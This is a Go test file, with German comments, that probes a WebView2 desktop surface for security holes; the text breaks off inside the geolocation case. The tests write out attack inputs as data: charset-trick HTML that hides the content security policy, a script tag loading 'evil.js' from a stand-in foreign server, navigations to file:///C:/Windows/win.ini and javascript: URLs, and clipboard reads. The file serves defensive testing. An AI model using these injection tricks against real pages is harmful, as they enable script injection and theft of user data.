//go:build windows

package fensterio

// Native Sonden gegen das echte WebView2 (SEC K6b-2). Opt-in: JNPT_NATIVE_WEBVIEW_PROBE=1, in einer
// interaktiven Sitzung (Fenster brauchen einen Desktop), WebView2-Runtime installiert. Nie auf dem
// Entwicklerrechner. Das Test-Binary braucht auf der Test-VM kein Go:
//
//	go test -c -o fensterio.test.exe ./internal/fensterio        (auf dem Build-Rechner)
//	set JNPT_NATIVE_WEBVIEW_PROBE=1
//	fensterio.test.exe -test.run TestWindowsWebView -test.v -test.timeout 10m   (als testnutzer, PATH ohne "jnpt")
//
// Eine Sonde je Ereignis; PASS ohne SKIP ist der Beleg. Jede Sonde hat eine Kontrolle, die zeigt, dass sie
// den Angriff überhaupt sehen kann (sonst wäre ein Grün blind).

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"testing"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/januaport/januaport-plugins/desktop-runner/internal/edge"
	"github.com/januaport/januaport-plugins/desktop-runner/internal/envsnap"
	"github.com/januaport/januaport-plugins/desktop-runner/internal/fenster"
	"github.com/januaport/januaport-plugins/desktop-runner/internal/platform"
)

// probeOptIn wird beim Start des Test-Binaries gelesen: Die erste Oberfläche entfernt JNPT*-Variablen aus der
// Umgebung (Auflage SEC a), danach wäre der Opt-in sonst weg.
var probeOptIn = os.Getenv("JNPT_NATIVE_WEBVIEW_PROBE") == "1"

// probeMode wählt, welche Schichten FremdserverNull aktiv hat (JNPT_NATIVE_WEBVIEW_PROBE_MODUS, leer = alle):
//
//	beide        alle Schichten (Standard)
//	nurSchicht1  nur der Ressourcenfilter, ohne Netz-Argumente
//	nurSchicht2  nur Netz aus (Proxy, DNS), ohne Filter
//
// So fährt man FremdserverNull unter einer gesetzten Richtlinie und sieht, welche Schicht sie aushebelt.
var probeMode = os.Getenv("JNPT_NATIVE_WEBVIEW_PROBE_MODUS")

// modeConfig übersetzt eine Betriebsart in die Schalter der Oberfläche (nur in-package).
func modeConfig(t *testing.T, mode string) func(*SurfaceConfig) {
	t.Helper()
	switch mode {
	case "", "beide":
		return nil
	case "nurSchicht1":
		return func(c *SurfaceConfig) { c.noNetLock = true }
	case "nurSchicht2":
		return func(c *SurfaceConfig) { c.noResourceFilter = true }
	}
	t.Fatalf("unbekannte Betriebsart %q", mode)
	return nil
}

var (
	pPeek     = user32.NewProc("PeekMessageW")
	pTransl   = user32.NewProc("TranslateMessage")
	pDispatch = user32.NewProc("DispatchMessageW")
)

type probeMsg struct {
	Window         uintptr
	Message        uint32
	WParam, LParam uintptr
	Time           uint32
	X, Y           int32
	Private        uint32
}

// probeGateway zeichnet die Werkzeugaufrufe der Seite auf: Die Seite meldet ihre Beobachtungen als
// Werkzeug "report" an die Brücke; so kommen sie durch genau den Weg, den sie später im Betrieb nehmen.
type probeGateway struct {
	mu        sync.Mutex
	events    []string
	versteckt int // Seiten, die visibilityState anders als "visible" gemeldet haben (die WebView war nicht sichtbar)
}

func (g *probeGateway) Werkzeuge(context.Context) (json.RawMessage, error) {
	return json.RawMessage(`{"tools":[]}`), nil
}
func (g *probeGateway) Werkzeug(_ context.Context, name string, args json.RawMessage) (json.RawMessage, error) {
	g.mu.Lock()
	if name == "seite_zustand" && !strings.Contains(string(args), `"sichtbar":"visible"`) {
		g.versteckt++
	}
	g.events = append(g.events, name+" "+string(args))
	g.mu.Unlock()
	return json.RawMessage(`{"ok":true}`), nil
}
func (g *probeGateway) hiddenPages() int {
	g.mu.Lock()
	defer g.mu.Unlock()
	return g.versteckt
}

func (g *probeGateway) reset() {
	g.mu.Lock()
	g.events = nil
	g.mu.Unlock()
}

// matching liefert die gemeldeten Ereignisse, die mit prefix beginnen, gequotet und begrenzt.
func (g *probeGateway) matching(prefix string) []string {
	var out []string
	for _, e := range g.snapshot() {
		if strings.HasPrefix(e, prefix) {
			out = append(out, fenster.DiagText(e))
		}
	}
	return out
}

func (g *probeGateway) snapshot() []string {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]string(nil), g.events...)
}

func (g *probeGateway) has(sub string) bool {
	g.mu.Lock()
	defer g.mu.Unlock()
	for _, e := range g.events {
		if strings.Contains(e, sub) {
			return true
		}
	}
	return false
}

type probeLokal struct{}

func (probeLokal) Status(context.Context) (fenster.Status, error) {
	return fenster.Status{Zustand: "arbeitet", Netz: true}, nil
}
func (probeLokal) Anhalten(context.Context) error { return nil }

// probeBed ist ein Fremdserver (loopback), der jeden Abruf zählt: Ein Treffer heißt, dass etwas ausgeleitet wurde.
type probeBed struct {
	t      *testing.T
	srv    *httptest.Server // Loopback
	ext    *httptest.Server // eigene IPv4-Adresse des Gasts, kein Loopback
	udp    *udpSink         // UDP-Senke auf Loopback
	udpExt *udpSink         // UDP-Senke auf der eigenen IPv4-Adresse des Gasts
	hits   atomic.Int32     // HTTP-Anfragen an beide Server
	conns  atomic.Int32     // neue TCP-Verbindungen zu beiden Servern (auch preconnect ohne Anfrage)
	t0     time.Time
	paths  sync.Mutex
	seen   []string
	hitLog []string
	gw     *probeGateway

	closers []func() // laufen auf dem Thread der Sonde, bevor er endet (Fenster gehören ihrem Thread)

	mu        sync.Mutex
	snapshots []func() []string // Spuren aller geöffneten Fenster, für die Ausgabe im Fehlerfall
}

// dump gibt im Fehlerfall alles aus, was die Sonde gesehen hat: die Spur jedes Fensters (native Ereignisse,
// Urteile mit Grund, NavigationCompleted mit Status, Antworten als ok oder fester Code) und die Meldungen der
// Seite an die Brücke. Texte der Seite laufen durch DiagText (gequotet, begrenzt, Träger maskiert).
func (b *probeBed) dump(t *testing.T) {
	t.Helper()
	b.mu.Lock()
	snaps := append([]func() []string(nil), b.snapshots...)
	b.mu.Unlock()
	for i, snap := range snaps {
		for _, line := range snap() {
			t.Logf("Spur %d: %s", i, line)
		}
	}
	for _, e := range b.gw.snapshot() {
		t.Logf("Seite meldet: %s", fenster.DiagText(e))
	}
	t.Logf("Fremdserver: %d Anfragen, %d Verbindungen, Pfade %v; UDP loopback %d, extern %d (Nutzlast %d)", b.hits.Load(), b.conns.Load(), b.seenPaths(), b.udp.packets.Load(), b.udpExt.packets.Load(), b.udpExt.payload.Load())
	b.paths.Lock()
	for _, line := range b.hitLog {
		t.Logf("Treffer %s", line)
	}
	b.paths.Unlock()
}

// ownIPv4 liefert eine IPv4-Adresse des Gasts, die weder Loopback noch Link-Local ist.
func ownIPv4() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, a := range addrs {
		ipn, ok := a.(*net.IPNet)
		if !ok {
			continue
		}
		if ip := ipn.IP.To4(); ip != nil && !ip.IsLoopback() && !ip.IsLinkLocalUnicast() && !ip.IsUnspecified() {
			return ip.String()
		}
	}
	return ""
}

// startServer startet einen zählenden Fremdserver. Jede Anfrage wird mit den Kopfzeilen Sec-Fetch-*, Sec-Purpose
// und Purpose festgehalten (Zeit relativ zum Start der Sonde), jede neue Verbindung wird gezählt.
func (b *probeBed) startServer(label, addr string) *httptest.Server {
	l, err := net.Listen("tcp", addr)
	if err != nil {
		b.t.Fatalf("%s: %v", label, err)
	}
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b.hits.Add(1)
		b.paths.Lock()
		b.seen = append(b.seen, r.URL.Path)
		b.hitLog = append(b.hitLog, fmt.Sprintf("+%dms %s %s %s dest=%s mode=%s site=%s sec-purpose=%s purpose=%s", time.Since(b.t0).Milliseconds(), label, r.Method, r.URL.Path,
			fenster.DiagText(r.Header.Get("Sec-Fetch-Dest")), fenster.DiagText(r.Header.Get("Sec-Fetch-Mode")), fenster.DiagText(r.Header.Get("Sec-Fetch-Site")),
			fenster.DiagText(r.Header.Get("Sec-Purpose")), fenster.DiagText(r.Header.Get("Purpose"))))
		b.paths.Unlock()
		w.Header().Set("Content-Type", "text/javascript")
		if strings.HasSuffix(r.URL.Path, ".zip") {
			w.Header().Set("Content-Disposition", "attachment")
		}
		fmt.Fprint(w, "")
	}))
	srv.Listener.Close()
	srv.Listener = l
	srv.Config.ConnState = func(_ net.Conn, st http.ConnState) {
		if st == http.StateNew {
			b.conns.Add(1)
			b.paths.Lock()
			b.hitLog = append(b.hitLog, fmt.Sprintf("+%dms %s neue Verbindung", time.Since(b.t0).Milliseconds(), label))
			b.paths.Unlock()
		}
	}
	srv.Start()
	b.t.Cleanup(srv.Close)
	return srv
}

func newProbeBed(t *testing.T) *probeBed {
	if !probeOptIn {
		t.Skip("opt-in: JNPT_NATIVE_WEBVIEW_PROBE=1 in einer interaktiven Sitzung mit WebView2-Runtime")
	}
	if strings.Contains(strings.ToLower(os.Getenv("PATH")), "jnpt") {
		t.Fatal("PATH trägt jnpt: Die Umgebung der Sonde muss sauber sein")
	}
	b := &probeBed{t: t, gw: &probeGateway{}, t0: time.Now()}
	b.srv = b.startServer("loopback", "127.0.0.1:0")
	ip := ownIPv4()
	if ip == "" {
		t.Fatal("keine Nicht-Loopback-IPv4-Adresse im Gast: Die Sonde wäre für die zweite Hälfte blind")
	}
	b.ext = b.startServer("extern", ip+":0")
	b.udp = b.startUDP("loopback", "127.0.0.1:0")
	b.udpExt = b.startUDP("extern", ip+":0")
	return b
}

func (b *probeBed) seenPaths() []string {
	b.paths.Lock()
	defer b.paths.Unlock()
	return append([]string(nil), b.seen...)
}

// openProbe legt Dateien in einen App-Ordner und öffnet ein echtes Fenster. Die Dateien gehen NICHT durch
// den Ladeprüfer (er lehnt die Angriffsdateien absichtlich ab); die Sonde belegt, was der Browser mit ihnen
// täte, und dass die native Sperre greift.
func (b *probeBed) openProbe(app string, files map[string]string, mutate func(*SurfaceConfig)) (*Surface, *Opened, *[]string) {
	t := b.t
	b.gw.reset() // Ereignisse früherer Unterfälle dürfen nie als Beleg dieses Falls zählen
	dir := t.TempDir()
	for name, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	host, err := NewHost(HostConfig{App: app, Gateway: b.gw, Lokal: probeLokal{}, Wake: func() {}})
	if err != nil {
		t.Fatal(err)
	}
	// Der Browser hält Dateien im Datenordner noch kurz nach dem Schließen offen; t.TempDir würde daran scheitern.
	dataRoot, err := os.MkdirTemp("", "probe-")
	if err != nil {
		t.Fatal(err)
	}
	b.closers = append(b.closers, func() { removeWhenFree(t, dataRoot) })
	o := &Opened{Name: app, Dir: dir, UserDataDir: filepath.Join(dataRoot, "webview", app), TestDevice: true, Host: host}
	var trace []string
	var stamps []time.Duration
	var mu sync.Mutex
	b.mu.Lock()
	b.snapshots = append(b.snapshots, func() []string {
		mu.Lock()
		defer mu.Unlock()
		out := make([]string, len(trace))
		for i, line := range trace {
			out[i] = fmt.Sprintf("+%dms %s", stamps[i].Milliseconds(), line)
		}
		return out
	})
	b.mu.Unlock()
	add := func(line string) {
		mu.Lock()
		trace = append(trace, line)
		stamps = append(stamps, time.Since(b.t0))
		mu.Unlock()
	}
	cfg := SurfaceConfig{
		OnLink: func(l Link) { add("link " + l.Host) },
		Probe:  func(ev, detail string) { add(ev + " " + detail) },
	}
	if mutate != nil {
		mutate(&cfg)
	}
	s, err := NewSurface(o, cfg)
	if err != nil {
		t.Fatalf("NewSurface: %v", err)
	}
	b.closers = append(b.closers, s.Close)
	return s, o, &trace
}

// pump läuft auf dem UI-Thread des Tests: Nachrichten verteilen, Antworten an die Seite geben, bis cond oder Frist.
func pump(t *testing.T, s *Surface, d time.Duration, cond func() bool) bool {
	t.Helper()
	deadline := time.Now().Add(d)
	var m probeMsg
	for time.Now().Before(deadline) {
		for {
			r, _, _ := pPeek.Call(uintptr(unsafe.Pointer(&m)), 0, 0, 0, 1)
			if r == 0 {
				break
			}
			pTransl.Call(uintptr(unsafe.Pointer(&m)))
			pDispatch.Call(uintptr(unsafe.Pointer(&m)))
		}
		if s != nil {
			s.Pump()
		}
		if cond != nil && cond() {
			return true
		}
		time.Sleep(15 * time.Millisecond)
	}
	return cond == nil
}

// probeFrist ist die Frist je Sonde (je Unterfall): Ein Hänger kostet genau eine Sonde, nicht den Lauf.
const probeFrist = 90 * time.Second

// run führt die Sonde auf einem eigenen, festen Thread mit COM-STA aus (genau wie das Bedienfeld) und gibt
// ihr eine eigene Frist. Der Thread bleibt gesperrt und endet mit der Goroutine, damit nichts von COM oder
// Fenstern in den Pool zurückläuft. Hängt die Sonde, schlägt nur dieser Test fehl.
func (b *probeBed) run(t *testing.T, frist time.Duration, body func(t *testing.T)) {
	t.Helper()
	done := make(chan struct{})
	go func() {
		defer close(done)
		runtime.LockOSThread()
		leave, err := EnterUI()
		if err != nil {
			t.Errorf("EnterUI: %v", err)
			return
		}
		defer leave()
		hiddenBefore := b.gw.hiddenPages()
		defer func() {
			// Für alle Sonden gilt: Die Seite war sichtbar. Sonst sagt kein Ergebnis etwas (Zeitgeber gedrosselt, Eingabe
			// kommt nicht an, Berechtigungen werden vertagt).
			if n := b.gw.hiddenPages() - hiddenBefore; n > 0 {
				t.Errorf("%d Seite(n) meldeten visibilityState != visible: Die WebView war nicht sichtbar geschaltet", n)
			}
			if t.Failed() {
				b.dump(t)
			}
			for i := len(b.closers) - 1; i >= 0; i-- {
				b.closers[i]()
			}
			b.closers = nil
		}()
		body(t)
	}()
	select {
	case <-done:
	case <-time.After(frist):
		b.dump(t)
		t.Fatalf("Sonde hängt: keine Rückmeldung innerhalb von %v", frist)
	}
}

func probePage(head, body string) string {
	return "<!doctype html><html><head><meta charset=\"utf-8\">" + fenster.CSPMeta() + head + "</head><body>" + body + "</body></html>"
}

const probeJS = `
function send(name, data) { window.chrome.webview.postMessage(JSON.stringify({id: String(Math.random()).slice(2), befehl: "werkzeug", args: {name: name, arguments: data}})); }
window.send = send;
send("js_ok", {seite: location.pathname});
send("seite_zustand", {sichtbar: document.visibilityState, fokus: document.hasFocus()});
`

// Kontrolle für alle: die Seite lädt, Skript läuft, die Brücke antwortet (auch mit Doppelbindestrich im Host).
func TestWindowsWebViewSeiteBrueckeUndHostname(t *testing.T) {
	b := newProbeBed(t)
	for _, app := range []string{"probe", "_probe_"} { // _ wird zu - : app--probe--pc.jnpt.invalid
		t.Run(app, func(t *testing.T) {
			b.t = t
			b.run(t, probeFrist, func(t *testing.T) {
				s, _, _ := b.openProbe(app, map[string]string{
					"index.html": probePage(`<script src="probe.js"></script>`, `<script src="start.js"></script>`),
					"probe.js":   probeJS,
					"start.js":   `send("geladen", {pfad: location.pathname, host: location.host, protokoll: location.protocol});`,
				}, nil)
				if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("geladen") }) {
					t.Fatal("Seite nicht geladen oder Brücke antwortet nicht (Hostname mit Doppelbindestrich?)")
				}
				host, _ := fenster.AppHost(app)
				if !b.gw.has(host) || !b.gw.has(`"pfad":"/index.html"`) || !b.gw.has("https:") {
					t.Fatalf("Seite lief auf falschem Host: %v", b.gw.events)
				}
			})
		})
	}
}

// F1/F4 am echten Browser: Mit dem Präfix des Läufers (Zeichensatz, dann CSP) hält die CSP; ohne Zeichensatz-Meta
// verschluckt der ISO-2022-JP-Trick sie (Kontrolle: Die Sonde sieht den Angriff).
func TestWindowsWebViewCSPUndZeichensatztrick(t *testing.T) {
	b := newProbeBed(t)
	esc := "\x1b"
	evil := `<script src="` + b.srv.URL + `/evil.js"></script>`
	fetchProbe := `<script src="fetch.js"></script>`
	fetchJS := `fetch("` + b.srv.URL + `/fetch").then(function(){send("fetch", {ok: true})}).catch(function(){send("fetch", {ok: false})});`
	cases := map[string]struct {
		html      string
		wantLeak  bool
		wantLabel string
	}{
		// SEC F4, Muster 1 und 2, Gegenprobe: erst Zeichensatz, dann CSP, dahinter die Falle.
		"f4MitPraefix":          {"<!doctype html><!--" + esc + "$B--><head>" + fenster.HeadPrefix() + esc + "(B-->" + evil + `<meta charset=iso-2022-jp>` + fetchProbe, false, "f4a"},
		"f4HttpEquivMitPraefix": {"<!doctype html><!--" + esc + "$B--><head>" + fenster.HeadPrefix() + esc + "(B-->" + evil + `<meta http-equiv="content-type" content="text/html; charset=iso-2022-jp">` + fetchProbe, false, "f4b"},
		// Kontrollen: ohne Zeichensatz-Meta (nur CSP) trägt der Trick, fremdes Skript läuft.
		"f4KontrolleOhneZeichensatz": {"<!doctype html><!--" + esc + "$B--><head>" + fenster.CSPMeta() + esc + "(B-->" + evil + `<meta charset=iso-2022-jp>` + fetchProbe, true, "f4k"},
		// SEC F1: Text vor <head> schiebt die CSP in den Body, der Browser ignoriert sie (Kontrolle).
		"f1KontrolleTextVorHead":   {"x<meta http-equiv=\"Content-Security-Policy\" content=\"" + fenster.CSP + "\">" + evil + fetchProbe, true, "f1k"},
		"f1KontrolleEndTagVorHead": {"</br><meta http-equiv=\"Content-Security-Policy\" content=\"" + fenster.CSP + "\">" + evil + fetchProbe, true, "f1k2"},
		// Der Präfix des Läufers hält auch bei langem Kommentar davor (Präfix hinter 1.024 Byte).
		"langerKommentarMitPraefix": {"<!doctype html><!--" + strings.Repeat("x", 2000) + "--><head>" + fenster.HeadPrefix() + evil + fetchProbe, false, "lang"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			b.t = t
			b.run(t, probeFrist, func(t *testing.T) {
				hitsBefore := b.hits.Load()
				s, _, trace := b.openProbe("probe", map[string]string{
					"index.html": tc.html,
					"probe.js":   probeJS,
					"fetch.js":   probeJS + fetchJS,
				}, nil)
				// probe.js muss vor fetch.js laufen: Die Seiten oben laden nur fetch.js; es lädt probe.js selbst.
				pump(t, s, 8*time.Second, func() bool { return b.gw.has("fetch") })
				// Das sehende Signal ist der Versuch: ein Treffer beim Fremdserver oder eine Anfrage, die Schicht 1 vor dem
				// Server abgefangen hat. Kontrollen brauchen den Versuch, Angriffsfälle dürfen ihn nicht haben.
				leaked := b.hits.Load() > hitsBefore
				for _, e := range *trace {
					if strings.HasPrefix(e, "WebResourceBlockiert ") && (strings.Contains(e, "/evil.js") || strings.Contains(e, "/fetch")) {
						leaked = true
					}
				}
				switch {
				case tc.wantLeak && !leaked:
					t.Fatalf("%s: Kontrolle blind. Die Sonde sieht den Angriff nicht; ein Grün bei den anderen Fällen wäre wertlos (Treffer: %v)", tc.wantLabel, b.seenPaths())
				case !tc.wantLeak && leaked:
					t.Fatalf("%s: CSP hielt nicht, der Fremdserver bekam %v", tc.wantLabel, b.seenPaths())
				}
			})
		})
	}
}

// F2 und NavigationStarting: Ein Link auf eine Nicht-HTML-Datei der eigenen App, auf einen fremden Host, ein
// meta refresh und location werden vor der Anfrage abgebrochen; die Seite bleibt.
func TestWindowsWebViewNavigationStarting(t *testing.T) {
	b := newProbeBed(t)
	foreign := b.srv.URL + "/ziel.html"
	svg := `<svg xmlns="http://www.w3.org/2000/svg"><script src="x" href="` + b.srv.URL + `/evil.js"/></svg>`
	for name, body := range map[string]string{
		"svgDerEigenenApp": `<a id="l" href="a.svg">x</a><script src="nav.js"></script>`,
		"fremderHost":      `<a id="l" href="` + foreign + `">x</a><script src="nav.js"></script>`,
		"locationFremd":    `<script src="nav.js"></script><script src="loc.js"></script>`,
		"metaRefresh":      `<meta http-equiv="refresh" content="0;url=` + foreign + `"><script src="nav.js"></script>`,
		"dataUrl":          `<a id="l" href="data:text/html,<script>1</script>">x</a><script src="nav.js"></script>`,
		"fileUrl":          `<a id="l" href="file:///C:/Windows/win.ini">x</a><script src="nav.js"></script>`,
		"javascriptUrl":    `<a id="l" href="javascript:send('js',{})">x</a><script src="nav.js"></script>`,
	} {
		t.Run(name, func(t *testing.T) {
			b.t = t
			b.run(t, probeFrist, func(t *testing.T) {
				hitsBefore := b.hits.Load()
				navJS := `var l = document.getElementById("l"); if (l) { l.click(); } setTimeout(function(){ send("nav", {pfad: location.pathname}); }, 1500);`
				s, _, trace := b.openProbe("probe", map[string]string{
					"index.html": probePage(`<script src="probe.js"></script>`, body),
					"probe.js":   probeJS,
					"nav.js":     navJS,
					"loc.js":     `location.href = "` + foreign + `";`,
					"a.svg":      svg,
				}, nil)
				if !pump(t, s, 20*time.Second, func() bool { return b.gw.has(`"pfad":"/index.html"`) }) {
					t.Fatalf("Seite nicht mehr auf /index.html oder nie geladen; Ereignisse: %v", *trace)
				}
				if b.hits.Load() != hitsBefore {
					t.Fatalf("Abruf beim Fremdserver: %v", b.seenPaths())
				}
				// Kontrolle: Der Auslöser lief. Ohne gemeldeten Navigationsversuch wäre das Grün leer.
				attempt := map[string]string{"svgDerEigenenApp": "/a.svg", "fremderHost": foreign, "locationFremd": foreign, "metaRefresh": foreign}[name]
				seen := false
				for _, e := range *trace {
					if attempt != "" && strings.HasPrefix(e, "NavigationStarting ") && strings.HasSuffix(e, attempt) {
						seen = true
					}
				}
				switch {
				case attempt != "" && !seen:
					t.Fatalf("Kontrolle blind: kein NavigationStarting auf %s gemeldet; Ereignisse: %v", attempt, *trace)
				case attempt == "":
					t.Logf("Navigationsversuch von %s ist nicht Teil der Kontrolle (Ereignisse: %v)", name, *trace)
				}
			})
		})
	}
}

// Kontrolle zu NavigationStarting: eigene HTML-Unterseite bleibt navigierbar.
func TestWindowsWebViewEigeneSeiteNavigierbar(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<a id="l" href="zwei.html">x</a><script src="klick.js"></script>`),
			"zwei.html":  probePage(`<script src="probe.js"></script>`, `<script src="zwei.js"></script>`),
			"klick.js":   `document.getElementById("l").click();`,
			"zwei.js":    `send("zwei", {pfad: location.pathname});`,
			"probe.js":   probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has(`"pfad":"/zwei.html"`) }) {
			t.Fatal("eigene .html-Unterseite lässt sich nicht öffnen")
		}
	})
}

// NewWindowRequested: window.open und target=_blank erzeugen nie ein Fenster; ein https-Link wird als
// Dialogvorschlag gemeldet, ein http-Ziel verschwindet.
func TestWindowsWebViewNewWindowRequested(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		hitsBefore := b.hits.Load()
		var links []string
		var mu sync.Mutex
		s, _, trace := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<a id="l" target="_blank" href="https://example.org/ziel">x</a><script src="win.js"></script>`),
			"probe.js":   probeJS,
			"win.js": `
var w1 = window.open("https://example.org/popup", "_blank");
var w2 = window.open("` + b.srv.URL + `/popup", "_blank");
document.getElementById("l").click();
setTimeout(function(){ send("fenster", {w1: w1 === null, w2: w2 === null}); }, 1500);`,
		}, func(c *SurfaceConfig) {
			c.OnLink = func(l Link) { mu.Lock(); links = append(links, l.Host+"|"+l.URL); mu.Unlock() }
		})
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("fenster") }) {
			t.Fatal("Seite meldet nicht")
		}
		mu.Lock()
		defer mu.Unlock()
		if b.hits.Load() != hitsBefore {
			t.Fatalf("Abruf beim Fremdserver: %v", b.seenPaths())
		}
		if len(links) == 0 || !strings.HasPrefix(links[0], "example.org|https://example.org/") {
			t.Fatalf("kein Dialogvorschlag für den https-Link: %v, Ereignisse %v", links, *trace)
		}
		if topLevelWindows(t) != 1 {
			t.Fatalf("zusätzliches Fenster entstanden (%d Top-Level-Fenster der Klasse)", topLevelWindows(t))
		}
	})
}

// DownloadStarting: Ein Download aus der eigenen App wird abgebrochen, es entsteht keine Datei.
func TestWindowsWebViewDownloadStarting(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		downloads := filepath.Join(t.TempDir(), "dl")
		_ = os.MkdirAll(downloads, 0o700)
		s, _, trace := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<a id="l" download="d.txt" href="daten.txt">x</a><script src="dl.js"></script>`),
			"dl.js":      `document.getElementById("l").click(); setTimeout(function(){send("dl", {});}, 1500);`,
			"probe.js":   probeJS,
			"daten.txt":  "geheim",
		}, nil)
		seen := false
		pump(t, s, 20*time.Second, func() bool {
			for _, e := range *trace {
				if strings.HasPrefix(e, "DownloadStarting") {
					seen = true
				}
			}
			return seen && b.gw.has("dl")
		})
		if !seen {
			t.Fatalf("DownloadStarting nie gemeldet (Kontrolle: Der Auslöser ist blind): %v", *trace)
		}
	})
}

// WebMessageReceived mit Source: Die Brücke bekommt die echte Quell-URL, nicht eine Annahme.
func TestWindowsWebViewNachrichtQuelle(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, trace := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script src="q.js"></script>`),
			"q.js":       `send("q", {});`,
			"probe.js":   probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("q ") }) {
			t.Fatal("Nachricht kam nicht an")
		}
		want := "WebMessageReceived " + fenster.StartURL("probe")
		found := false
		for _, e := range *trace {
			if e == want {
				found = true
			}
		}
		if !found {
			t.Fatalf("Quelle nicht als %q gemeldet: %v", want, *trace)
		}
	})
}

// Berechtigungen, Maßstab ist die Wirkung (SEC-Urteil Lauf 7): Die Seite darf weder Zwischenablage noch Standort noch
// Benachrichtigungen bekommen. Ob das Ereignis PermissionRequested ablehnt oder der Browser schon vorher selbst
// verweigert, wird getrennt gemeldet: "Ereignis lehnt ab" ist der Beleg der Sperre, "Browser verweigert selbst" ist
// kein Beleg der Ereignis-Sperre, aber ein grünes Ergebnis der Wirkung, wenn die Seite nichts erhält. Zeitablauf
// ist nie ein Beleg: Geolocation braucht einen Rückruf der Seite. Erhält die Seite etwas, ist das ein Fund.
func TestWindowsWebViewBerechtigungenAbgelehnt(t *testing.T) {
	b := newProbeBed(t)
	deny := fmt.Sprintf("antwort=%d", edge.CoreWebView2PermissionStateDeny)
	asked := func(trace []string, art int) (n, denied int) {
		for _, e := range trace {
			if strings.HasPrefix(e, fmt.Sprintf("PermissionRequested art=%d ", art)) {
				n++
				if strings.HasSuffix(e, deny) {
					denied++
				}
			}
		}
		return
	}
	// Zwischenablage und Standort verlangen eine Nutzeraktivierung und den Fokus der Seite. Die Seite führt die Abfrage
	// deshalb erst im click-Handler aus und meldet document.hasFocus() dort. Den Klick liefert der Host (Maus auf die
	// Fläche, im Sekundentakt); kommt keiner, ist der Fall rot ("kein Klick, unbelegt"), nie grün.
	const clickJS = `
var geklickt = false;
window.addEventListener("focus", function(){ send("fenster_fokus", {ereignis: "focus"}); });
window.addEventListener("blur", function(){ send("fenster_fokus", {ereignis: "blur"}); });
function beiAktivierung(start) {
  // Die erste Aktivierung der Seite löst aus: Klick, Maus- oder Zeigertaste oder eine Taste des Hosts.
  ["click", "mousedown", "pointerdown", "keydown"].forEach(function(art){
    document.addEventListener(art, function(){ if (geklickt) { return; } geklickt = true; send("klick", {art: art, hat: document.hasFocus()}); start(); }, true);
  });
  setTimeout(function(){ if (!geklickt) { send("kein_klick", {}); } }, 25000);
}
var beiKlick = beiAktivierung;
`
	marker := fmt.Sprintf("synthetisch-zwischenablage-%x", time.Now().UnixNano())
	clipJS := clickJS + `beiKlick(function(){
  navigator.clipboard.readText()
    .then(function(t){ send("clip", {ok: true, gleich: t === window.MARKER, laenge: t.length}); })
    .catch(function(e){ send("clip", {ok: false, name: e.name}); });
});`
	cases := []struct {
		name  string
		js    string
		ready string
		art   int
		allow bool
		clip  bool
		check func(t *testing.T, n, denied int, trace []string)
	}{
		{"benachrichtigungen", `Notification.requestPermission().then(function(r){ send("notif", {antwort: r}); });`, "notif ", 4, false, false,
			func(t *testing.T, n, denied int, trace []string) {
				if !b.gw.has(`"antwort":"denied"`) || b.gw.has(`"antwort":"granted"`) {
					t.Fatalf("Benachrichtigungen nicht abgelehnt: %v", b.gw.snapshot())
				}
				if n == 0 || denied != n {
					t.Fatalf("PermissionRequested art=4: %d gemeldet, %d abgelehnt: %v", n, denied, trace)
				}
			}},
		{"zwischenablageLesen", clipJS, "clip ", 6, false, true,
			func(t *testing.T, n, denied int, trace []string) {
				if b.gw.has(`"gleich":true`) || b.gw.has(`"ok":true`) {
					t.Fatalf("FUND: Die Seite hat die Zwischenablage gelesen: %v", b.gw.snapshot())
				}
				if !b.gw.has(`"ok":false`) {
					t.Fatalf("kein Fehler der Seite: %v", b.gw.snapshot())
				}
				if n > 0 && denied != n {
					t.Fatalf("PermissionRequested art=6 nicht abgelehnt: %v", trace)
				}
				if n == 0 {
					t.Logf("zwischenablageLesen: Browser verweigert selbst (kein PermissionRequested); die Seite erhielt nichts, die Ereignis-Sperre ist hier nicht belegt (Fokus: %v)", b.gw.has(`"hat":true`))
				} else {
					t.Logf("zwischenablageLesen: Ereignis lehnt ab (%d-mal)", n)
				}
			}},
		// Sehende Kontrolle: Mit erlaubten Berechtigungen bekommt dieselbe Seite den synthetischen Wert. Ohne das sagt
		// "erhält nichts" nichts.
		{"zwischenablageKontrolle", clipJS, "clip ", 6, true, true,
			func(t *testing.T, n, denied int, trace []string) {
				if !b.gw.has(`"gleich":true`) {
					t.Fatalf("Kontrolle blind: Bei erlaubter Berechtigung liest die Seite den synthetischen Wert nicht (Fokus: %v): %v", b.gw.has(`"hat":true`), b.gw.snapshot())
				}
			}},
		{"geolocation", clickJS + `
function status(name){ navigator.permissions.query({name: "geolocation"}).then(function(p){ send(name, {state: p.state}); }).catch(function(e){ send(name, {fehler: e.name}); }); }
status("geo_status");
beiKlick(function(){
